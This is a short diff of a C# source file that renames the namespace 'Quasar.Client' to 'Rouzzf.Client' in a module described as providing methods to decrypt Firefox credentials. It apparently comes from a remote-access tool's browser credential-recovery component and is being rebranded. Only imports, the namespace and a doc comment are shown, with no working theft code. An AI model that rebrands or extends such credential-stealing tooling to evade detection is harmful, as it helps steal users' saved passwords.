@@ -1,10 +1,10 @@
-﻿using Quasar.Client.Utilities;
+﻿using Rouzzf.Client.Utilities;
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     /// <summary>
     /// Provides methods to decrypt Firefox credentials.
